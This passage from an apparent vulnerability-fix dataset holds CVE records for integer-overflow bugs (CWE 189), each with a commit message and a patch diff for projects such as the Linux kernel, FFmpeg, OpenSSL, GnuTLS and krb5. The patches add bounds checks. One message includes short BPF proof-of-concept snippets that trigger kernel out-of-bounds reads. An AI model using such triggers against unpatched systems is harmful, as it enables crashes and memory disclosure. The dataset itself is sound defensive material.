*p_this )\n             if( tk->p_subpackets[ j ] )\n                 block_Release( tk->p_subpackets[ j ] );\n         }\n-        if( tk->i_subpackets )\n-        {\n-            free( tk->p_subpackets );\n-            free( tk->p_subpackets_timecode );\n-        }\n+        free( tk->p_subpackets );\n+        free( tk->p_subpackets_timecode );\n         if( tk->p_sipr_packet )\n             block_Release( tk->p_sipr_packet );\n         free( tk );\n@@ -636,6 +633,11 @@ static void DemuxAudioMethod1( demux_t *p_demux, real_track_t *tk, mtime_t i_pts\n \n         for( int i = 0; i < i_num; i++ )\n         {\n+            int i_index = tk->i_subpacket_h * i +\n+                          ((tk->i_subpacket_h + 1) \/ 2) * (y&1) + (y>>1);\n+            if( i_index >= tk->i_subpackets )\n+                return;\n+\n             block_t *p_block = block_New( p_demux, tk->i_subpacket_size );\n             if( !p_block )\n                 return;\n@@ -648,9 +650,6 @@ static void DemuxAudioMethod1( demux_t *p_demux, real_track_t *tk, mtime_t i_pts\n \n             p_buf += tk->i_subpacket_size;\n \n-            int i_index = tk->i_subpacket_h * i +\n-                          ((tk->i_subpacket_h + 1) \/ 2) * (y&1) + (y>>1);\n-\n             if( tk->p_subpackets[i_index] != NULL )\n             {\n                 msg_Dbg(p_demux, \"p_subpackets[ %d ] not null!\",  i_index );\n@@ -670,14 +669,16 @@ static void DemuxAudioMethod1( demux_t *p_demux, real_track_t *tk, mtime_t i_pts\n \n         for( int i = 0; i < tk->i_subpacket_h \/ 2; i++ )\n         {\n+            int i_index = (i * 2 * tk->i_frame_size \/ tk->i_coded_frame_size) + y;\n+            if( i_index >= tk->i_subpackets )\n+                return;\n+\n             block_t *p_block = block_New( p_demux, tk->i_coded_frame_size);\n             if( !p_block )\n                 return;\n             if( &p_buf[tk->i_coded_frame_size] > &p_sys->buffer[p_sys->i_buffer] )\n                 return;\n \n-            int i_index = (i * 2 * tk->i_frame_size \/ tk->i_coded_frame_size) + y;\n-\n             memcpy( p_block->p_buffer, p_buf, tk->i_coded_frame_size );\n             p_block->i_dts =\n             p_block->i_pts = i_index == 0 ? i_pts : VLC_TS_INVALID;\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-8545","CWE_ID":"189","category":"security","commit_id":"3e2b745020c2dbf0201fe7df3dad9e7e0b2e1bb6","commit_message":"From 3e2b745020c2dbf0201fe7df3dad9e7e0b2e1bb6 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Fri, 3 Oct 2014 17:35:58 +0200\nSubject: [PATCH] avcodec\/pngdec: Check bits per pixel before setting monoblack\n pixel format\n\nFixes out of array accesses\nFixes: asan_heap-oob_14dbfcf_4_asan_heap-oob_1ce5767_179_add_method_small.png\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/pngdec.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavcodec\/pngdec.c b\/libavcodec\/pngdec.c\nindex da91aab7cb..f3603b3cda 100644\n--- a\/libavcodec\/pngdec.c\n+++ b\/libavcodec\/pngdec.c\n@@ -650,7 +650,7 @@ static int decode_frame(AVCodecContext *avctx,\n                 } else if ((s->bits_per_pixel == 1 || s->bits_per_pixel == 2 || s->bits_per_pixel == 4 || s->bits_per_pixel == 8) &&\n                            s->color_type == PNG_COLOR_TYPE_PALETTE) {\n                     avctx->pix_fmt = AV_PIX_FMT_PAL8;\n-                } else if (s->bit_depth == 1) {\n+                } else if (s->bit_depth == 1 && s->bits_per_pixel == 1) {\n                     avctx->pix_fmt = AV_PIX_FMT_MONOBLACK;\n                 } else if (s->bit_depth == 8 &&\n                            s->color_type == PNG_COLOR_TYPE_GRAY_ALPHA) {\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-3145","CWE_ID":"189","category":"security","commit_id":"05ab8f2647e4221cbdb3856dd7d32bd5407316b3","commit_message":"From 05ab8f2647e4221cbdb3856dd7d32bd5407316b3 Mon Sep 17 00:00:00 2001\nFrom: Mathias Krause <minipli@googlemail.com>\nDate: Sun, 13 Apr 2014 18:23:33 +0200\nSubject: [PATCH] filter: prevent nla extensions to peek beyond the end of the\n message\n\nThe BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check\nfor a minimal message length before testing the supplied offset to be\nwithin the bounds of the message. This allows the subtraction of the nla\nheader to underflow and therefore -- as the data type is unsigned --\nallowing far to big offset and length values for the search of the\nnetlink attribute.\n\nThe remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is\nalso wrong. It has the minuend and subtrahend mixed up, therefore\ncalculates a huge length value, allowing to overrun the end of the\nmessage while looking for the netlink attribute.\n\nThe following three BPF snippets will trigger the bugs when attached to\na UNIX datagram socket and parsing a message with length 1, 2 or 3.\n\n ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nla\n | ret\ta\n `---\n\n ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\n ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--\n | ; (needs a fake netlink header at offset 0)\n | ld\t#0\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\nFix the first issue by ensuring the message length fulfills the minimal\nsize constrains of a nla header. Fix the second bug by getting the math\nfor the remainder calculation right.\n\nFixes: 4738c1db15 (\"[SKFILTER]: Add SKF_ADF_NLATTR instruction\")\nFixes: d214c7537b (\"filter: add SKF_AD_NLATTR_NEST to look for nested..\")\nCc: Patrick McHardy <kaber@trash.net>\nCc: Pablo Neira Ayuso <pablo@netfilter.org>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Daniel Borkmann <dborkman@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/core\/filter.c | 8 +++++++-\n 1 file changed, 7 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/net\/core\/filter.c b\/net\/core\/filter.c\nindex e08b3822c72a8..0e0856f5d7084 100644\n--- a\/net\/core\/filter.c\n+++ b\/net\/core\/filter.c\n@@ -600,6 +600,9 @@ static u64 __skb_get_nlattr(u64 ctx, u64 A, u64 X, u64 r4, u64 r5)\n \tif (skb_is_nonlinear(skb))\n \t\treturn 0;\n \n+\tif (skb->len < sizeof(struct nlattr))\n+\t\treturn 0;\n+\n \tif (A > skb->len - sizeof(struct nlattr))\n \t\treturn 0;\n \n@@ -618,11 +621,14 @@ static u64 __skb_get_nlattr_nest(u64 ctx, u64 A, u64 X, u64 r4, u64 r5)\n \tif (skb_is_nonlinear(skb))\n \t\treturn 0;\n \n+\tif (skb->len < sizeof(struct nlattr))\n+\t\treturn 0;\n+\n \tif (A > skb->len - sizeof(struct nlattr))\n \t\treturn 0;\n \n \tnla = (struct nlattr *) &skb->data[A];\n-\tif (nla->nla_len > A - skb->len)\n+\tif (nla->nla_len > skb->len - A)\n \t\treturn 0;\n \n \tnla = nla_find_nested(nla, X);\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-0851","CWE_ID":"189","category":"security","commit_id":"2d795c731e6729309044607154978696a87fd900","commit_message":"From 2d795c731e6729309044607154978696a87fd900 Mon Sep 17 00:00:00 2001\nFrom: Scott Cantor <cantor.2@osu.edu>\nDate: Sun, 5 Jul 2015 19:11:33 +0000\nSubject: [PATCH] CPPXT-104 - Add exception handling to integer conversions\n\n---\n xmltooling\/base.h             | 22 ++++++++++++++++++++--\n xmltooling\/util\/XMLHelper.cpp |  8 +++++---\n 2 files changed, 25 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/xmltooling\/base.h b\/xmltooling\/base.h\nindex 0393062..c55b5d1 100644\n--- a\/xmltooling\/base.h\n+++ b\/xmltooling\/base.h\n@@ -811,7 +811,16 @@\n         XMLCh* m_##proper; \\\n     public: \\\n         pair<bool,int> get##proper() const { \\\n-            return make_pair((m_##proper!=nullptr),(m_##proper!=nullptr ? xercesc::XMLString::parseInt(m_##proper): 0)); \\\n+            if (m_##proper) { \\\n+                try { \\\n+                    return std::make_pair(true, xercesc::XMLString::parseInt(m_##proper)); \\\n+                } \\\n+                catch (...) { \\\n+                    return std::make_pair(true, 0); \\\n+                } \\\n+            } else { \\\n+                return std::make_pair(false, 0); \\\n+            } \\\n         } \\\n         void set##proper(const XMLCh* proper) { \\\n             m_##proper = prepareForAssignment(m_##proper,proper); \\\n@@ -1369,7 +1378,16 @@\n #define DECL_INTEGER_CONTENT(proper) \\\n     XMLTOOLING_DOXYGEN(Returns proper in integer form after a NULL indicator.) \\\n     std::pair<bool,int> get##proper() const { \\\n-        return std::make_pair((getTextContent()!=nullptr), (getTextContent()!=nullptr ? xercesc::XMLString::parseInt(getTextContent()) : 0)); \\\n+        if (getTextContent()) { \\\n+            try { \\\n+                return std::make_pair(true, xercesc::XMLString::parseInt(getTextContent())); \\\n+            } \\\n+            catch (...) { \\\n+                return std::make_pair(true, 0); \\\n+            } \\\n+        } else { \\\n+            return std::make_pair(false, 0); \\\n+        } \\\n     } \\\n     XMLTOOLING_DOXYGEN(Sets proper.) \\\n     void set##proper(int proper) { \\\ndiff --git a\/xmltooling\/util\/XMLHelper.cpp b\/xmltooling\/util\/XMLHelper.cpp\nindex a270de4..2682395 100644\n--- a\/xmltooling\/util\/XMLHelper.cpp\n+++ b\/xmltooling\/util\/XMLHelper.cpp\n@@ -338,9 +338,11 @@ int XMLHelper::getAttrInt(const DOMElement* e, int defValue, const XMLCh* localN\n     if (e) {\n         const XMLCh* val = e->getAttributeNS(ns, localName);\n         if (val && *val) {\n-            int i = XMLString::parseInt(val);\n-            if (i)\n-                return i;\n+            try {\n+                return XMLString::parseInt(val);\n+            }\n+            catch (XMLException&) {\n+            }\n         }\n     }\n     return defValue;\n-- \n1.8.3.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2016-2105","CWE_ID":"189","category":"security","commit_id":"5b814481f3573fa9677f3a31ee51322e2a22ee6a","commit_message":"From 5b814481f3573fa9677f3a31ee51322e2a22ee6a Mon Sep 17 00:00:00 2001\nFrom: Matt Caswell <matt@openssl.org>\nDate: Fri, 4 Mar 2016 10:17:17 +0000\nSubject: [PATCH] Avoid overflow in EVP_EncodeUpdate\n\nAn overflow can occur in the EVP_EncodeUpdate function which is used for\nBase64 encoding of binary data. If an attacker is able to supply very large\namounts of input data then a length check can overflow resulting in a heap\ncorruption. Due to the very large amounts of data involved this will most\nlikely result in a crash.\n\nInternally to OpenSSL the EVP_EncodeUpdate function is primarly used by the\nPEM_write_bio* family of functions. These are mainly used within the\nOpenSSL command line applications, so any application which processes\ndata from an untrusted source and outputs it as a PEM file should be\nconsidered vulnerable to this issue.\n\nUser applications that call these APIs directly with large amounts of\nuntrusted data may also be vulnerable.\n\nIssue reported by Guido Vranken.\n\nCVE-2016-2105\n\nReviewed-by: Richard Levitte <levitte@openssl.org>\n---\n crypto\/evp\/encode.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/crypto\/evp\/encode.c b\/crypto\/evp\/encode.c\nindex c6abc4ae8e..a5d0c653cc 100644\n--- a\/crypto\/evp\/encode.c\n+++ b\/crypto\/evp\/encode.c\n@@ -157,7 +157,7 @@ void EVP_EncodeUpdate(EVP_ENCODE_CTX *ctx, unsigned char *out, int *outl,\n     if (inl <= 0)\n         return;\n     OPENSSL_assert(ctx->length <= (int)sizeof(ctx->enc_data));\n-    if ((ctx->num + inl) < ctx->length) {\n+    if (ctx->length - ctx->num > inl) {\n         memcpy(&(ctx->enc_data[ctx->num]), in, inl);\n         ctx->num += inl;\n         return;\n-- \n2.17.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-4656","CWE_ID":"189","category":"security","commit_id":"ac902c112d90a89e59916f751c2745f4dbdbb4bd","commit_message":"From ac902c112d90a89e59916f751c2745f4dbdbb4bd Mon Sep 17 00:00:00 2001\nFrom: Lars-Peter Clausen <lars@metafoo.de>\nDate: Wed, 18 Jun 2014 13:32:34 +0200\nSubject: ALSA: control: Handle numid overflow\n\nEach control gets automatically assigned its numids when the control is created.\nThe allocation is done by incrementing the numid by the amount of allocated\nnumids per allocation. This means that excessive creation and destruction of\ncontrols (e.g. via SNDRV_CTL_IOCTL_ELEM_ADD\/REMOVE) can cause the id to\neventually overflow. Currently when this happens for the control that caused the\noverflow kctl->id.numid + kctl->count will also over flow causing it to be\nsmaller than kctl->id.numid. Most of the code assumes that this is something\nthat can not happen, so we need to make sure that it won't happen\n\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de>\nAcked-by: Jaroslav Kysela <perex@perex.cz>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>\n---\n sound\/core\/control.c | 4 ++++\n 1 file changed, 4 insertions(+)\n\n","diff_code":"diff --git a\/sound\/core\/control.c b\/sound\/core\/control.c\nindex 5c49f976fc7b..8d6e4bae7407 100644\n--- a\/sound\/core\/control.c\n+++ b\/sound\/core\/control.c\n@@ -288,6 +288,10 @@ static bool snd_ctl_remove_numid_conflict(struct snd_card *card,\n {\n \tstruct snd_kcontrol *kctl;\n \n+\t\/* Make sure that the ids assigned to the control do not wrap around *\/\n+\tif (card->last_numid >= UINT_MAX - count)\n+\t\tcard->last_numid = 0;\n+\n \tlist_for_each_entry(kctl, &card->controls, list) {\n \t\tif (kctl->id.numid < card->last_numid + 1 + count &&\n \t\t    kctl->id.numid + kctl->count > card->last_numid + 1) {\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-3191","CWE_ID":"189","category":"security","commit_id":"9438fabb73eb48055b58b89fc51e0bc4db22fabd","commit_message":"From 9438fabb73eb48055b58b89fc51e0bc4db22fabd Mon Sep 17 00:00:00 2001\nFrom: Jeff Layton <jlayton@redhat.com>\nDate: Tue, 23 Aug 2011 07:21:28 -0400\nSubject: [PATCH] cifs: fix possible memory corruption in CIFSFindNext\n\nThe name_len variable in CIFSFindNext is a signed int that gets set to\nthe resume_name_len in the cifs_search_info. The resume_name_len however\nis unsigned and for some infolevels is populated directly from a 32 bit\nvalue sent by the server.\n\nIf the server sends a very large value for this, then that value could\nlook negative when converted to a signed int. That would make that\nvalue pass the PATH_MAX check later in CIFSFindNext. The name_len would\nthen be used as a length value for a memcpy. It would then be treated\nas unsigned again, and the memcpy scribbles over a ton of memory.\n\nFix this by making the name_len an unsigned value in CIFSFindNext.\n\nCc: <stable@kernel.org>\nReported-by: Darren Lavender <dcl@hppine99.gbr.hp.com>\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <sfrench@us.ibm.com>\n---\n fs\/cifs\/cifssmb.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/fs\/cifs\/cifssmb.c b\/fs\/cifs\/cifssmb.c\nindex aac37d99a487b..a80f7bd97b90d 100644\n--- a\/fs\/cifs\/cifssmb.c\n+++ b\/fs\/cifs\/cifssmb.c\n@@ -4079,7 +4079,8 @@ int CIFSFindNext(const int xid, struct cifs_tcon *tcon,\n \tT2_FNEXT_RSP_PARMS *parms;\n \tchar *response_data;\n \tint rc = 0;\n-\tint bytes_returned, name_len;\n+\tint bytes_returned;\n+\tunsigned int name_len;\n \t__u16 params, byte_count;\n \n \tcFYI(1, \"In FindNext\");\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-6376","CWE_ID":"189","category":"security","commit_id":"17d68b763f09a9ce824ae23eb62c9efc57b69271","commit_message":"From 17d68b763f09a9ce824ae23eb62c9efc57b69271 Mon Sep 17 00:00:00 2001\nFrom: Gleb Natapov <gleb@redhat.com>\nDate: Thu, 12 Dec 2013 21:20:08 +0100\nSubject: [PATCH] KVM: x86: fix guest-initiated crash with x2apic\n (CVE-2013-6376)\n\nA guest can cause a BUG_ON() leading to a host kernel crash.\nWhen the guest writes to the ICR to request an IPI, while in x2apic\nmode the following things happen, the destination is read from\nICR2, which is a register that the guest can control.\n\nkvm_irq_delivery_to_apic_fast uses the high 16 bits of ICR2 as the\ncluster id.  A BUG_ON is triggered, which is a protection against\naccessing map->logical_map with an out-of-bounds access and manages\nto avoid that anything really unsafe occurs.\n\nThe logic in the code is correct from real HW point of view. The problem\nis that KVM supports only one cluster with ID 0 in clustered mode, but\nthe code that has the bug does not take this into account.\n\nReported-by: Lars Bull <larsbull@google.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Gleb Natapov <gleb@redhat.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n arch\/x86\/kvm\/lapic.c | 5 ++++-\n 1 file changed, 4 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/arch\/x86\/kvm\/lapic.c b\/arch\/x86\/kvm\/lapic.c\nindex b8bec45c1610d..dec48bfaddb8f 100644\n--- a\/arch\/x86\/kvm\/lapic.c\n+++ b\/arch\/x86\/kvm\/lapic.c\n@@ -143,6 +143,8 @@ static inline int kvm_apic_id(struct kvm_lapic *apic)\n \treturn (kvm_apic_get_reg(apic, APIC_ID) >> 24) & 0xff;\n }\n \n+#define KVM_X2APIC_CID_BITS 0\n+\n static void recalculate_apic_map(struct kvm *kvm)\n {\n \tstruct kvm_apic_map *new, *old = NULL;\n@@ -180,7 +182,8 @@ static void recalculate_apic_map(struct kvm *kvm)\n \t\tif (apic_x2apic_mode(apic)) {\n \t\t\tnew->ldr_bits = 32;\n \t\t\tnew->cid_shift = 16;\n-\t\t\tnew->cid_mask = new->lid_mask = 0xffff;\n+\t\t\tnew->cid_mask = (1 << KVM_X2APIC_CID_BITS) - 1;\n+\t\t\tnew->lid_mask = 0xffff;\n \t\t} else if (kvm_apic_sw_enabled(apic) &&\n \t\t\t\t!new->cid_mask \/* flat mode *\/ &&\n \t\t\t\tkvm_apic_get_reg(apic, APIC_DFR) == APIC_DFR_CLUSTER) {\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2009-3638","CWE_ID":"189","category":"security","commit_id":"6a54435560efdab1a08f429a954df4d6c740bddf","commit_message":"From 6a54435560efdab1a08f429a954df4d6c740bddf Mon Sep 17 00:00:00 2001\nFrom: Avi Kivity <avi@redhat.com>\nDate: Sun, 4 Oct 2009 16:45:13 +0200\nSubject: KVM: Prevent overflow in KVM_GET_SUPPORTED_CPUID\n\nThe number of entries is multiplied by the entry size, which can\noverflow on 32-bit hosts.  Bound the entry count instead.\n\nReported-by: David Wagner <daw@cs.berkeley.edu>\nCc: stable@kernel.org\nSigned-off-by: Avi Kivity <avi@redhat.com>\n---\n arch\/x86\/kvm\/x86.c | 2 ++\n 1 file changed, 2 insertions(+)\n\n","diff_code":"diff --git a\/arch\/x86\/kvm\/x86.c b\/arch\/x86\/kvm\/x86.c\nindex be451ee44249..9b9695322f56 100644\n--- a\/arch\/x86\/kvm\/x86.c\n+++ b\/arch\/x86\/kvm\/x86.c\n@@ -1591,6 +1591,8 @@ static int kvm_dev_ioctl_get_supported_cpuid(struct kvm_cpuid2 *cpuid,\n \n \tif (cpuid->nent < 1)\n \t\tgoto out;\n+\tif (cpuid->nent > KVM_MAX_CPUID_ENTRIES)\n+\t\tcpuid->nent = KVM_MAX_CPUID_ENTRIES;\n \tr = -ENOMEM;\n \tcpuid_entries = vmalloc(sizeof(struct kvm_cpuid_entry2) * cpuid->nent);\n \tif (!cpuid_entries)\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2008-1948","CWE_ID":"189","category":"security","commit_id":"bc8102405fda11ea00ca3b42acc4f4bce9d6e97b","commit_message":"From bc8102405fda11ea00ca3b42acc4f4bce9d6e97b Mon Sep 17 00:00:00 2001\nFrom: Simon Josefsson <simon@josefsson.org>\nDate: Mon, 19 May 2008 10:34:08 +0200\nSubject: [PATCH] Fix GNUTLS-SA-2008-1 security vulnerabilities. See\n http:\/\/www.gnu.org\/software\/gnutls\/security.html for updates.\n\n---\n lib\/ext_server_name.c  | 27 ++++++++++++++++++++-------\n lib\/gnutls_cipher.c    | 14 +++++++++++---\n lib\/gnutls_handshake.c |  8 ++++++++\n 3 files changed, 39 insertions(+), 10 deletions(-)\n\n","diff_code":"diff --git a\/lib\/ext_server_name.c b\/lib\/ext_server_name.c\nindex 72e42ff..a2db949 100644\n--- a\/lib\/ext_server_name.c\n+++ b\/lib\/ext_server_name.c\n@@ -74,10 +74,27 @@ _gnutls_server_name_recv_params (gnutls_session_t session,\n \t  len = _gnutls_read_uint16 (p);\n \t  p += 2;\n \n-\t  DECR_LENGTH_RET (data_size, len, 0);\n-\t  server_names++;\n+\t  if (len > 0)\n+\t    {\n+\t      DECR_LENGTH_RET (data_size, len, 0);\n+\t      server_names++;\n+\t      p += len;\n+\t    }\n+\t  else\n+\t    _gnutls_handshake_log\n+\t      (\"HSK[%x]: Received zero size server name (under attack?)\\n\",\n+\t       session);\n \n-\t  p += len;\n+\t}\n+\n+      \/* we cannot accept more server names.\n+       *\/\n+      if (server_names > MAX_SERVER_NAME_EXTENSIONS)\n+\t{\n+\t  _gnutls_handshake_log\n+\t    (\"HSK[%x]: Too many server names received (under attack?)\\n\",\n+\t     session);\n+\t  server_names = MAX_SERVER_NAME_EXTENSIONS;\n \t}\n \n       session->security_parameters.extensions.server_names_size =\n@@ -85,10 +102,6 @@ _gnutls_server_name_recv_params (gnutls_session_t session,\n       if (server_names == 0)\n \treturn 0;\t\t\/* no names found *\/\n \n-      \/* we cannot accept more server names.\n-       *\/\n-      if (server_names > MAX_SERVER_NAME_EXTENSIONS)\n-\tserver_names = MAX_SERVER_NAME_EXTENSIONS;\n \n       p = data + 2;\n       for (i = 0; i < server_names; i++)\ndiff --git a\/lib\/gnutls_cipher.c b\/lib\/gnutls_cipher.c\nindex ad192f4..778402a 100644\n--- a\/lib\/gnutls_cipher.c\n+++ b\/lib\/gnutls_cipher.c\n@@ -459,6 +459,14 @@ _gnutls_ciphertext2compressed (gnutls_session_t session,\n       return GNUTLS_E_INTERNAL_ERROR;\n     }\n \n+  if (ciphertext.size < (unsigned) blocksize + hash_size)\n+    {\n+      _gnutls_record_log\n+\t(\"REC[%x]: Short record length %d < %d + %d (under attack?)\\n\",\n+\t session, ciphertext.size, blocksize, hash_size);\n+      gnutls_assert ();\n+      return GNUTLS_E_DECRYPTION_FAILED;\n+    }\n \n   \/* actual decryption (inplace)\n    *\/\n@@ -510,9 +518,7 @@ _gnutls_ciphertext2compressed (gnutls_session_t session,\n \n       pad = ciphertext.data[ciphertext.size - 1] + 1;\t\/* pad *\/\n \n-      length = ciphertext.size - hash_size - pad;\n-\n-      if (pad > ciphertext.size - hash_size)\n+      if ((int)pad > (int)ciphertext.size - hash_size)\n \t{\n \t  gnutls_assert ();\n \t  \/* We do not fail here. We check below for the\n@@ -521,6 +527,8 @@ _gnutls_ciphertext2compressed (gnutls_session_t session,\n \t  pad_failed = GNUTLS_E_DECRYPTION_FAILED;\n \t}\n \n+      length = ciphertext.size - hash_size - pad;\n+\n       \/* Check the pading bytes (TLS 1.x)\n        *\/\n       if (ver >= GNUTLS_TLS1 && pad_failed == 0)\ndiff --git a\/lib\/gnutls_handshake.c b\/lib\/gnutls_handshake.c\nindex 4ab6db6..d798180 100644\n--- a\/lib\/gnutls_handshake.c\n+++ b\/lib\/gnutls_handshake.c\n@@ -1003,6 +1003,14 @@ _gnutls_recv_handshake_header (gnutls_session_t session,\n \n       *recv_type = session->internals.handshake_header_buffer.recv_type;\n \n+      if (*recv_type != type)\n+\t{\n+\t  gnutls_assert ();\n+\t  _gnutls_handshake_log\n+\t    (\"HSK[%x]: Handshake type mismatch (under attack?)\\n\", session);\n+\t  return GNUTLS_E_UNEXPECTED_HANDSHAKE_PACKET;\n+\t}\n+\n       return session->internals.handshake_header_buffer.packet_length;\n     }\n \n-- \n1.9.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-3859","CWE_ID":"189","category":"security","commit_id":"253eacc070b114c2ec1f81b067d2fed7305467b0","commit_message":"From 253eacc070b114c2ec1f81b067d2fed7305467b0 Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Sat, 30 Oct 2010 16:43:10 -0700\nSubject: net: Truncate recvfrom and sendto length to INT_MAX.\n\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/socket.c | 4 ++++\n 1 file changed, 4 insertions(+)\n\n","diff_code":"diff --git a\/net\/socket.c b\/net\/socket.c\nindex abf3e2561521..2808b4db46ee 100644\n--- a\/net\/socket.c\n+++ b\/net\/socket.c\n@@ -1652,6 +1652,8 @@ SYSCALL_DEFINE6(sendto, int, fd, void __user *, buff, size_t, len,\n \tstruct iovec iov;\n \tint fput_needed;\n \n+\tif (len > INT_MAX)\n+\t\tlen = INT_MAX;\n \tsock = sockfd_lookup_light(fd, &err, &fput_needed);\n \tif (!sock)\n \t\tgoto out;\n@@ -1709,6 +1711,8 @@ SYSCALL_DEFINE6(recvfrom, int, fd, void __user *, ubuf, size_t, size,\n \tint err, err2;\n \tint fput_needed;\n \n+\tif (size > INT_MAX)\n+\t\tsize = INT_MAX;\n \tsock = sockfd_lookup_light(fd, &err, &fput_needed);\n \tif (!sock)\n \t\tgoto out;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-4345","CWE_ID":"189","category":"security","commit_id":"dc7ed55c689d57de7f7408b34631bf06fec9dab1","commit_message":"From dc7ed55c689d57de7f7408b34631bf06fec9dab1 Mon Sep 17 00:00:00 2001\nFrom: Tomas Kuthan <tkuthan@gmail.com>\nDate: Fri, 1 Aug 2014 15:25:50 +0200\nSubject: [PATCH] Fix LDAP key data segmentation [CVE-2014-4345]\n\nFor principal entries having keys with multiple kvnos (due to use of\n-keepold), the LDAP KDB module makes an attempt to store all the keys\nhaving the same kvno into a single krbPrincipalKey attribute value.\nThere is a fencepost error in the loop, causing currkvno to be set to\nthe just-processed value instead of the next kvno.  As a result, the\nsecond and all following groups of multiple keys by kvno are each\nstored in two krbPrincipalKey attribute values.  Fix the loop to use\nthe correct kvno value.\n\nCVE-2014-4345:\n\nIn MIT krb5, when kadmind is configured to use LDAP for the KDC\ndatabase, an authenticated remote attacker can cause it to perform an\nout-of-bounds write (buffer overrun) by performing multiple cpw\n-keepold operations.  An off-by-one error while copying key\ninformation to the new database entry results in keys sharing a common\nkvno being written to different array buckets, in an array whose size\nis determined by the number of kvnos present.  After sufficient\niterations, the extra writes extend past the end of the\n(NULL-terminated) array.  The NULL terminator is always written after\nthe end of the loop, so no out-of-bounds data is read, it is only\nwritten.\n\nHistorically, it has been possible to convert an out-of-bounds write\ninto remote code execution in some cases, though the necessary\nexploits must be tailored to the individual application and are\nusually quite complicated.  Depending on the allocated length of the\narray, an out-of-bounds write may also cause a segmentation fault\nand\/or application crash.\n\n    CVSSv2 Vector: AV:N\/AC:M\/Au:S\/C:C\/I:C\/A:C\/E:POC\/RL:OF\/RC:C\n\n[ghudson@mit.edu: clarified commit message]\n[kaduk@mit.edu: CVE summary, CVSSv2 vector]\n\n(cherry picked from commit 81c332e29f10887c6b9deb065f81ba259f4c7e03)\n\nticket: 7980\nversion_fixed: 1.12.2\nstatus: resolved\n---\n src\/plugins\/kdb\/ldap\/libkdb_ldap\/ldap_principal2.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/src\/plugins\/kdb\/ldap\/libkdb_ldap\/ldap_principal2.c b\/src\/plugins\/kdb\/ldap\/libkdb_ldap\/ldap_principal2.c\nindex 515eba7684..111b554851 100644\n--- a\/src\/plugins\/kdb\/ldap\/libkdb_ldap\/ldap_principal2.c\n+++ b\/src\/plugins\/kdb\/ldap\/libkdb_ldap\/ldap_principal2.c\n@@ -463,7 +463,8 @@ krb5_encode_krbsecretkey(krb5_key_data *key_data_in, int n_key_data,\n             j++;\n             last = i + 1;\n \n-            currkvno = key_data[i].key_data_kvno;\n+            if (i < n_key_data - 1)\n+                currkvno = key_data[i + 1].key_data_kvno;\n         }\n     }\n     ret[num_versions] = NULL;\n","owner":"krb5","repo":"krb5","source":"cve"},{"CVE_ID":"CVE-2011-4352","CWE_ID":"189","category":"security","commit_id":"eef5c35b4352ec49ca41f6198bee8a976b1f81e5","commit_message":"From eef5c35b4352ec49ca41f6198bee8a976b1f81e5 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Fri, 18 Nov 2011 18:08:31 +0100\nSubject: [PATCH] vp3dec: Check coefficient index in vp3_dequant() Fixes\n NGS00145\n\nFound-by: Phillip Langlois\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/vp3.c | 4 ++++\n 1 file changed, 4 insertions(+)\n\n","diff_code":"diff --git a\/libavcodec\/vp3.c b\/libavcodec\/vp3.c\nindex 23db9b9034..83ec4d80f0 100644\n--- a\/libavcodec\/vp3.c\n+++ b\/libavcodec\/vp3.c\n@@ -1309,6 +1309,10 @@ static inline int vp3_dequant(Vp3DecodeContext *s, Vp3Fragment *frag,\n         case 1: \/\/ zero run\n             